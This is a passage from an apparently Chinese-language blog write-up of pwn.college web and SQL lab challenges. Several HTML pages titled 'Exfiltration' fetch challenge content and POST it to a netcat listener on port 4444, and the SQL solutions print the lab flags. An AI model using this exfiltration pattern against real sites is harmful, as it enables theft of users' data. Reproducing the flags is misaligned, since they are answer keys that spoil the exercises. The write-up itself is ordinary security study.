id="30-Listening-Web"><a href="#30-Listening-Web" class="headerlink" title="30. Listening Web"></a>30. Listening Web</h4><p>把第一关的Server代码copy到这儿，然后修改端口并运行即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os<br><br>app = flask.Flask(__name__)<br><br>app.secret_key = os.urandom(<span class="hljs-number">8</span>)<br>app.run(<span class="hljs-string">&quot;challenge.localhost&quot;</span>, <span class="hljs-number">1337</span>)<br></code></pre></td></tr></table></figure><h4 id="31-Speaking-Redirects"><a href="#31-Speaking-Redirects" class="headerlink" title="31. Speaking Redirects"></a>31. Speaking Redirects</h4><p>写Server端的重定向即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os<br><br>app = flask.Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redirector</span>():<br>    <span class="hljs-keyword">return</span> flask.redirect(<span class="hljs-string">f&quot;http://challenge.localhost:80/submission&quot;</span>)<br><br>app.secret_key = os.urandom(<span class="hljs-number">8</span>)<br>app.run(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>)<br></code></pre></td></tr></table></figure><h4 id="32-JavaScript-Redirects"><a href="#32-JavaScript-Redirects" class="headerlink" title="32. JavaScript Redirects"></a>32. JavaScript Redirects</h4><p>写一个JavaScript代码，放在<code>/home/hacker/public_html/solve.html</code>中即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Redirecting...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;http://challenge.localhost:80/request&quot;</span>;</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="33-Including-JavaScript"><a href="#33-Including-JavaScript" class="headerlink" title="33. Including JavaScript"></a>33. Including JavaScript</h4><p>这道题的思路是，首先客户端请求<code>solve.html</code>，我们在其中写入javascript脚本，让其访问服务器指定paths的javascript脚本并执行，随后将该执行结果重定向到某个能看到的地方即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Exfiltration<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://challenge.localhost/mission&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;http://challenge.localhost:80/?flag=&quot;</span> + flag;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>javascript中的src属性：</p><p>当JavaScript的<code>&lt;scirpt&gt;</code>标签的src属性指定一个URL时，浏览器会发送一个HTTP GET请求到指定的URL，请求相应资源。获取资源（一般是javascript文件）后会下载JavaScript文件，解析并执行其中的JavaScript代码。</p></blockquote><h4 id="34-HTTP-javascript"><a href="#34-HTTP-javascript" class="headerlink" title="34. HTTP (javascript)"></a>34. HTTP (javascript)</h4><p>这道题真坑哇，这和那个CORS没关系。也不需要启动浏览器调试，也调试不了。得开practice模式调试。思路就是，直接使用fetch目标，然后对拿到的data做处理，让它发送给一个其他服务器就好了。我用的是nc -l 4444，监听4444端口。然后那边用POST提交数据就OK了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Exfiltration<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://challenge.localhost:80/task&#x27;</span>)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span>(!response.<span class="hljs-property">ok</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">website_content</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Content received from challenge.localhost:80:&quot;</span>, website_content);</span><br><span class="language-javascript">            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://localhost:4444/&quot;</span>, &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">headers</span>:&#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">body</span>: website_content,</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="35-HTTP-Get-Parameters-javascript"><a href="#35-HTTP-Get-Parameters-javascript" class="headerlink" title="35. HTTP Get Parameters (javascript)"></a>35. HTTP Get Parameters (javascript)</h4><p>加参数而已，只需要在fetch里直接加。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Exfiltration<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://challenge.localhost:80/complete?challenge_key=vjcopwsk&amp;secure_key=zqzbftms&amp;auth=yzcibfla&#x27;</span>)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span>(!response.<span class="hljs-property">ok</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">website_content</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Content received from challenge.localhost:80:&quot;</span>, website_content);</span><br><span class="language-javascript">            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://localhost:4444/&quot;</span>, &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">headers</span>:&#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">body</span>: website_content,</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h4 id="36-HTTP-Forms-javascript"><a href="#36-HTTP-Forms-javascript" class="headerlink" title="36. HTTP Forms (javascript)"></a>36. HTTP Forms (javascript)</h4><p>查一下，fetch如何发送POST请求时加参数就好了。思路清晰后，就是语法的问题，AI的出现让这些问题都不是问题。所以重要的是思路。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Exfiltration<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>();</span><br><span class="language-javascript">        params.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;auth_pass&#x27;</span>,<span class="hljs-string">&#x27;hvapqzli&#x27;</span>);</span><br><span class="language-javascript">        params.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;solution&#x27;</span>, <span class="hljs-string">&#x27;kmdajdmm&#x27;</span>);</span><br><span class="language-javascript">        params.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;security_token&#x27;</span>, <span class="hljs-string">&#x27;zprqxfbr&#x27;</span>);</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://challenge.localhost:80/submission&#x27;</span>,&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">headers</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">body</span>: params,</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span>(!response.<span class="hljs-property">ok</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">website_content</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Content received from challenge.localhost:80:&quot;</span>, website_content);</span><br><span class="language-javascript">            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://localhost:4444/&quot;</span>, &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">headers</span>:&#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">body</span>: website_content,</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="SQL-Playground"><a href="#SQL-Playground" class="headerlink" title="SQL Playground"></a>SQL Playground</h3><h4 id="1-SQL-Queries"><a href="#1-SQL-Queries" class="headerlink" title="1. SQL Queries"></a>1. SQL Queries</h4><p>简单的SQL语法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~sql-queries:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> name from sqlite_master <span class="hljs-built_in">where</span> <span class="hljs-built_in">type</span> = <span class="hljs-string">&#x27;table&#x27;</span><br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;information&#x27;</span>&#125;<br>hacker@sql-playground~sql-queries:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> * from information<br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;record&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;sL39JzNFAYS1b4urGcF1vDs5hcn.QX5kzN0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-Filtering-SQL"><a href="#2-Filtering-SQL" class="headerlink" title="2. Filtering SQL"></a>2. Filtering SQL</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~filtering-sql:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> info from repository <span class="hljs-built_in">where</span> info like <span class="hljs-string">&#x27;%pwn%&#x27;</span><br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;info&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;UIysK2dWKY3qPB4nHgeDwWXQnHb.QXwADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-Choosing-Columns"><a href="#3-Choosing-Columns" class="headerlink" title="3. Choosing Columns"></a>3. Choosing Columns</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~choosing-columns:~/Desktop$ /challenge/sql <br>sql&gt; SELECT sql FROM sqlite_master WHERE <span class="hljs-built_in">type</span> = <span class="hljs-string">&#x27;table&#x27;</span> AND name = <span class="hljs-string">&#x27;resources&#x27;</span>;<br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;sql&#x27;</span>: <span class="hljs-string">&#x27;CREATE TABLE resources(flag_tag,datum)&#x27;</span>&#125;<br>hacker@sql-playground~choosing-columns:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> datum from resources <span class="hljs-built_in">where</span> datum like <span class="hljs-string">&quot;%pwn%&quot;</span>;<br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;datum&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;k6URsZ8-uBwi_TNBBVNFI7zEreQ.QXxADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-Exclusionary-Filtering"><a href="#4-Exclusionary-Filtering" class="headerlink" title="4. Exclusionary Filtering"></a>4. Exclusionary Filtering</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~exclusionary-filtering:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> secret from data <span class="hljs-built_in">where</span> secret like <span class="hljs-string">&#x27;%pwn.college%&#x27;</span><br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;secret&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;AcDNrhXELmHNhramheE64AkS0AB.QXyADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-Filtering-Strings"><a href="#5-Filtering-Strings" class="headerlink" title="5. Filtering Strings"></a>5. Filtering Strings</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~filtering-strings:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> record from secrets <span class="hljs-built_in">where</span> record like <span class="hljs-string">&#x27;%pwn.college%&#x27;</span><br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;record&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;ctyoxv05RHMSQR6B2ybT7siWQZs.QXzADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="6-Filtering-on-Expressions"><a href="#6-Filtering-on-Expressions" class="headerlink" title="6. Filtering on Expressions"></a>6. Filtering on Expressions</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~filtering-on-expressions:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> detail from items <span class="hljs-built_in">where</span> detail like <span class="hljs-string">&#x27;%pwn.college%&#x27;</span><br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;detail&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;QwM7-oEhh9lTAvkfmOVVXEUbCj3.QX0ADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="7-SELECTING-Expressions"><a href="#7-SELECTING-Expressions" class="headerlink" title="7. SELECTING Expressions"></a>7. SELECTING Expressions</h4><p>用substr限制5个字符的输出，然后一点点拼接出flag。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> substr(payload, <span class="hljs-number">56</span>, <span class="hljs-number">5</span>) <span class="hljs-keyword">from</span> payloads <span class="hljs-keyword">where</span> payload <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%pwn.college%&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="8-Composite-Conditions"><a href="#8-Composite-Conditions" class="headerlink" title="8. Composite Conditions"></a>8. Composite Conditions</h4><p>记得使用cat查看<code>/challenge/sql</code>的源码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sql</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> payload <span class="hljs-keyword">from</span> entries <span class="hljs-keyword">where</span> payload <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;pwn.college&#123;%&#x27;</span> <span class="hljs-keyword">and</span> payload <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#125;&#x27;</span> <span class="hljs-keyword">and</span> flag_tag <span class="hljs-operator">=</span> <span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure><h4 id="9-Reaching-Your-LIMITs"><a href="#9-Reaching-Your-LIMITs" class="headerlink" title="9. Reaching Your LIMITs"></a>9. Reaching Your LIMITs</h4><p><code>limit</code>的应用，因为limit的特性，再结合源码。因此limit 1时，输出的就是正确的flag。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sql</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> content <span class="hljs-keyword">from</span> notes <span class="hljs-keyword">where</span> content <span class="hljs-keyword">like</span> &quot;pwn.college&#123;%&quot; <span class="hljs-keyword">and</span> content <span class="hljs-keyword">like</span> &quot;%&#125;&quot; limit <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="10-Querying-Metadata"><a href="#10-Querying-Metadata" class="headerlink" title="10. Querying Metadata"></a>10. Querying Metadata</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sql</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> name <span class="hljs-keyword">from</span> sqlite_master <span class="hljs-keyword">where</span> type <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;table&#x27;</span><br>Got <span class="hljs-number">1</span> rows.<br><span class="hljs-operator">-</span> &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;NAtlxoGT&#x27;</span>&#125;<br><span class="hljs-keyword">sql</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> text <span class="hljs-keyword">from</span> NAtlxoGT<br></code></pre></td></tr></table></figure><h1 id="Core-Material"><a href="#Core-Material" class="headerlink" title="Core Material"></a>Core Material</h1><h2 id="Intro-to-Cybersecurity"><a href="#Intro-to-Cybersecurity" class="headerlink" title="Intro to Cybersecurity"></a>Intro to Cybersecurity</h2><p>TO DO !!!</p><h2 id="Program-Security"><a href="#Program-Security" class="headerlink" title="Program Security"></a>Program Security</h2><h3 id="Shellcode-Injection"><a href="#Shellcode-Injection" class="headerlink" title="Shellcode Injection"></a>Shellcode 